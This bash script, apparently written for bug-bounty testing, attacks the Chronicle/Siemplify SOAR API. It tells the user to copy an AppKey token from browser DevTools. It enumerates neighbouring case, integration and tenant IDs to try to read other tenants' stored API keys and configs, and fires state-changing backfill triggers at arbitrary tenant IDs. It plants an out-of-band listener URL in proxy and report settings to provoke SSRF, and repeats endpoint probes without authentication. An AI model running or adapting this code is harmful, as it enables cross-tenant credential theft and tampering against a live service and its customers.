#!/usr/bin/env bash
# Chronicle SOAR — targeted IDOR + SSRF tests
# Requires: free Google SecOps trial account at cloud.google.com/security/products/security-operations
#
# How to get TOKEN:
#   1. Log in to app.siemplify-soar.com (your trial tenant)
#   2. Browser DevTools → Network → any API request → copy "AppKey" header value
#      OR: look in localStorage for "siemplifyToken" or Authorization header
#   3. export SOAR_TOKEN="<your-token>"
#   4. export SOAR_TENANT="<your-tenant-subdomain>"  # e.g. "mytrial"
#
# Run: SOAR_TOKEN=xxx SOAR_TENANT=mytrial bash scripts/scan-chronicle-idor.sh
set -uo pipefail

cd "$(dirname "$0")/.."

SOAR_TOKEN="${SOAR_TOKEN:-}"
SOAR_TENANT="${SOAR_TENANT:-app}"

if [ -z "${SOAR_TOKEN}" ]; then
    echo "ERROR: Set SOAR_TOKEN env var to your SOAR API token (AppKey header value)"
    echo "       Get it from: DevTools → Network → any /api/external/ request → AppKey header"
    exit 1
fi

TARGET="${SOAR_TENANT}.siemplify-soar.com"
APP_TARGET="app.siemplify-soar.com"
STAMP=$(date -u +%Y%m%d-%H%M)
OUT=~/bug-bounty-hunting-/results/chronicle.security/evidence/idor-${STAMP}
mkdir -p "${OUT}"

LOG="${OUT}/idor-scan.log"
exec > >(tee -a "$LOG") 2>&1

echo "=== CHRONICLE SOAR IDOR/SSRF SCAN — ${STAMP} ==="
echo "Tenant: ${TARGET}"
./scripts/scope-check.sh "${TARGET}" || { echo "SCOPE FAIL"; exit 1; }
./scripts/scope-check.sh "${APP_TARGET}" || true

UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"

# Authenticated probe helper
probe() {
    local METHOD="$1"
    local BPATH="$2"
    local HOST="${3:-${TARGET}}"
    local DATA="${4:-}"
    local RESP CODE BODY
    if [ -n "${DATA}" ]; then
        RESP=$(curl -sk --max-time 20 \
            -X "${METHOD}" \
            -H "User-Agent: ${UA}" \
            -H "Accept: application/json" \
            -H "Content-Type: application/json" \
            -H "AppKey: ${SOAR_TOKEN}" \
            -d "${DATA}" \
            -w "\n__CODE__%{http_code}" \
            "https://${HOST}${BPATH}" 2>/dev/null)
    else
        RESP=$(curl -sk --max-time 20 \
            -X "${METHOD}" \
            -H "User-Agent: ${UA}" \
            -H "Accept: application/json" \
            -H "AppKey: ${SOAR_TOKEN}" \
            -w "\n__CODE__%{http_code}" \
            "https://${HOST}${BPATH}" 2>/dev/null)
    fi
    CODE="${RESP##*__CODE__}"
    BODY="${RESP%__CODE__*}"
    echo "[${CODE}] ${METHOD} https://${HOST}${BPATH}"
    if [ "${CODE}" != "000" ]; then
        echo "${BODY}" | python3 -m json.tool 2>/dev/null | head -20 || echo "${BODY}" | head -5
    fi
    echo "---"
    printf '%s %s [%s]: %s\n' "${METHOD}" "${BPATH}" "${CODE}" "${BODY}" >> "${OUT}/all-responses.jsonl"
}

# ── Phase A: Establish baseline — get your own resource IDs ──────────────────
echo ""
echo "[A] Establishing baseline — fetching YOUR tenant's IDs..."
echo "[A] Your cases (to get real caseIds)..."
probe "POST" "/api/external/v1/cases-queue/GetCaseCardsByRequest" "${TARGET}" \
    '{"pageSize":5,"pageNumber":0}'

echo "[A] Your connectors..."
probe "GET" "/api/external/v1/connectors/cards" "${TARGET}"

echo "[A] Your integration instances..."
probe "GET" "/api/external/v1/integrations/GetInstalledIntegrations" "${TARGET}"

echo "[A] Your webhooks..."
probe "GET" "/api/external/v1/webhooks-management/Cards" "${TARGET}"

echo "[A] Your SOC roles..."
probe "GET" "/api/external/v1/socroles/GetSocRoles" "${TARGET}"

echo "[A] System version (fingerprint)..."
probe "GET" "/api/external/v1/settings/GetSystemVersion" "${TARGET}"

echo "[A] Environments (get tenantId)..."
probe "POST" "/api/external/v1/settings/GetEnvironments" "${TARGET}" "{}"

# Save baseline for manual review
echo "[A] Baseline saved — note the IDs above for IDOR testing below."
echo "[A] Now manually set: MY_CASE_ID, MY_CONNECTOR_ID, MY_INTEGRATION_ID below"
echo ""

# ── Phase B: IDOR — cross-tenant resource access ──────────────────────────────
# Set these after getting baseline:
MY_CASE_ID="${MY_CASE_ID:-1}"
MY_INTEGRATION_ID="${MY_INTEGRATION_ID:-1}"
MY_CONNECTOR_ID="${MY_CONNECTOR_ID:-}"

# Calculate adjacent IDs for IDOR
CASE_MINUS=$((MY_CASE_ID - 1))
CASE_PLUS=$((MY_CASE_ID + 1))
INT_MINUS=$((MY_INTEGRATION_ID - 1))
INT_PLUS=$((MY_INTEGRATION_ID + 1))

echo "[B] IDOR tests — probing adjacent IDs (your caseId=${MY_CASE_ID}, integId=${MY_INTEGRATION_ID})..."
echo ""

echo "[B1] GetCaseFullDetails — your case (baseline)..."
probe "GET" "/api/external/v1/cases/GetCaseFullDetails/${MY_CASE_ID}" "${TARGET}"

echo "[B1] GetCaseFullDetails — caseId-1 (should be 403/404 if yours is lowest)..."
probe "GET" "/api/external/v1/cases/GetCaseFullDetails/${CASE_MINUS}" "${TARGET}"

echo "[B1] GetCaseFullDetails — caseId+1..."
probe "GET" "/api/external/v1/cases/GetCaseFullDetails/${CASE_PLUS}" "${TARGET}"

echo "[B1] GetCaseFullDetails — also probe from APP tenant against YOUR case IDs..."
probe "GET" "/api/external/v1/cases/GetCaseFullDetails/${MY_CASE_ID}" "${APP_TARGET}"

echo ""
echo "[B2] GetIntegrationInstanceSettings — integration stores API keys!"
echo "[B2] Your integration instance (baseline)..."
probe "GET" "/api/external/v1/integrations/GetIntegrationInstanceSettings/${MY_INTEGRATION_ID}" "${TARGET}"

echo "[B2] integrationInstanceId-1..."
probe "GET" "/api/external/v1/integrations/GetIntegrationInstanceSettings/${INT_MINUS}" "${TARGET}"

echo "[B2] integrationInstanceId+1..."
probe "GET" "/api/external/v1/integrations/GetIntegrationInstanceSettings/${INT_PLUS}" "${TARGET}"

echo "[B2] From APP tenant — probe YOUR integration IDs..."
probe "GET" "/api/external/v1/integrations/GetIntegrationInstanceSettings/${MY_INTEGRATION_ID}" "${APP_TARGET}"
probe "GET" "/api/external/v1/integrations/GetIntegrationInstanceSettings/${INT_MINUS}" "${APP_TARGET}"

echo ""
echo "[B3] configuration-items/{tenantId} — direct tenant config access..."
# Try tenantId = 1, 2, 3 (likely sequential)
for TID in 1 2 3 4 5 10; do
    probe "GET" "/api/external/v1/configuration-items/${TID}" "${TARGET}"
done

echo ""
echo "[B4] {tenantId}/pubsub-backfill:trigger — trigger action on arbitrary tenant..."
for TID in 1 2 3; do
    probe "POST" "/api/external/v1/${TID}/pubsub-backfill:trigger" "${TARGET}" "{}"
done

echo ""
echo "[B5] Wall/activity data — case history contains potentially sensitive info..."
probe "GET" "/api/external/v1/cases/wall/${MY_CASE_ID}" "${TARGET}"
probe "GET" "/api/external/v1/cases/wall/${CASE_PLUS}" "${TARGET}"
probe "GET" "/api/external/v1/dynamic-cases/GetWallActivities/${CASE_PLUS}" "${TARGET}"

# ── Phase C: SSRF tests ───────────────────────────────────────────────────────
echo ""
echo "[C] SSRF Tests..."
OOB="${OOB_URL:-https://your-oob.oast.pro}"
echo "[C] OOB listener URL: ${OOB}"
echo "[C] Start interactsh-client BEFORE running these tests!"
echo ""

echo "[C1] TestProxySettings — server makes outbound connection to proxy URL..."
# Schema: proxyServerAddressXml + targetAddressXml
probe "POST" "/api/external/v1/settings/TestProxySettings" "${TARGET}" \
    "{\"username\":\"\",\"password\":\"\",\"proxyServerAddressXml\":\"${OOB}/ssrf-proxy-C1\",\"targetAddressXml\":\"${OOB}/ssrf-target-C1\",\"ignoreAddressXml\":\"\"}"

echo "[C2] TestAdvancedReportsSettings — server fetches BI report URL..."
probe "GET" "/api/external/v1/settings/TestAdvancedReportsSettings" "${TARGET}"

echo "[C2b] SaveAdvancedReportsSettings with OOB URL, then test..."
probe "POST" "/api/external/v1/settings/SaveAdvancedReportsSettings" "${TARGET}" \
    "{\"advancedReportsUrl\":\"${OOB}/ssrf-reports-C2\",\"advancedReportProvider\":1,\"advancedReportSessionLength\":30}"

echo "[C3] TestPublisherConnectivity — tests outbound to publisher URL..."
# First list publishers to get a valid ID
probe "GET" "/api/external/v1/agents/GetPublishers" "${TARGET}"

# ── Phase D: Unauthenticated endpoint re-probe (PATH bug now fixed) ───────────
echo ""
echo "[D] Re-probing endpoints WITHOUT auth (PATH bug fixed)..."

probe_unauth() {
    local METHOD="$1"
    local BPATH="$2"
    local DESC="$3"
    local RESP CODE BODY
    RESP=$(curl -sk --max-time 15 \
        -X "${METHOD}" \
        -H "User-Agent: ${UA}" \
        -H "Accept: application/json" \
        -w "\n__CODE__%{http_code}" \
        "https://${TARGET}${BPATH}" 2>/dev/null)
    CODE="${RESP##*__CODE__}"
    BODY="${RESP%__CODE__*}"
    echo "[UNAUTH][${CODE}] ${METHOD} ${BPATH} — ${DESC}"
    if [ "${CODE}" != "401" ] && [ "${CODE}" != "000" ] && [ "${CODE}" != "403" ]; then
        echo "  BODY: ${BODY}" | head -5
        printf '%s %s [%s]: %s\n' "${METHOD}" "${BPATH}" "${CODE}" "${BODY}" \
            >> "${OUT}/unauth-hits.txt"
    fi
}

probe_unauth "GET" "/api/external/v1/settings/GetSystemVersion" "version (no auth?)"
probe_unauth "GET" "/api/external/v1/connectors/cards" "connector list (no auth?)"
probe_unauth "GET" "/api/external/v1/integrations/GetInstalledIntegrations" "integrations (no auth?)"
probe_unauth "GET" "/api/external/v1/socroles/GetSocRoles" "SOC roles (no auth?)"
probe_unauth "GET" "/api/external/v1/warroom/GetForgotPasswordTimeLimit" "password reset (no auth?)"
probe_unauth "GET" "/api/external/v1/warroom/GetDepartments" "departments (no auth?)"
probe_unauth "GET" "/api/external/v1/store/GetIntegrationsStoreData" "integrations store (no auth?)"
probe_unauth "GET" "/api/external/v1/store/GetUsecasesCards" "use cases (no auth?)"
probe_unauth "GET" "/api/external/v1/settings/GetLatestLicenseAgreement" "license (no auth?)"
probe_unauth "GET" "/api/external/v1/settings/GetPublicCertificate" "public cert (no auth?)"

# Also try on APP tenant without auth
for BPATH in \
    "/api/external/v1/settings/GetSystemVersion" \
    "/api/external/v1/connectors/cards" \
    "/api/external/v1/socroles/GetSocRoles" \
    "/api/external/v1/warroom/GetForgotPasswordTimeLimit" \
    "/api/external/v1/store/GetIntegrationsStoreData"; do
    RESP=$(curl -sk --max-time 15 \
        -H "User-Agent: ${UA}" -H "Accept: application/json" \
        -w "\n__CODE__%{http_code}" \
        "https://${APP_TARGET}${BPATH}" 2>/dev/null)
    CODE="${RESP##*__CODE__}"
    BODY="${RESP%__CODE__*}"
    if [ "${CODE}" != "401" ] && [ "${CODE}" != "000" ] && [ "${CODE}" != "403" ]; then
        echo "[APP-UNAUTH][${CODE}] ${BPATH}"
        echo "  BODY: ${BODY}" | head -3
        printf 'APP %s [%s]: %s\n' "${BPATH}" "${CODE}" "${BODY}" >> "${OUT}/unauth-hits.txt"
    fi
done

# ── Summary ──────────────────────────────────────────────────────────────────
echo ""
echo "=== IDOR/SSRF SCAN COMPLETE — ${STAMP} ==="
echo "All responses : ${OUT}/all-responses.jsonl"
echo "Unauth hits   : $(wc -l < "${OUT}/unauth-hits.txt" 2>/dev/null || echo 0)"
echo "Log           : ${LOG}"
echo ""
echo "REVIEW PRIORITY:"
echo "  1. GetIntegrationInstanceSettings responses — do adjacent IDs return OTHER tenant's API keys?"
echo "  2. configuration-items/{tenantId} — does tenantId=1,2,3 return other tenant configs?"
echo "  3. TestProxySettings — did OOB listener get a hit?"
echo "  4. Any unauth hits: ${OUT}/unauth-hits.txt"
echo ""
echo "If GetIntegrationInstanceSettings/{id+1} returns data → CRITICAL IDOR (cross-tenant credential access)"
echo "If TestProxySettings OOB hit → SSRF from GCP → HIGH/CRITICAL"
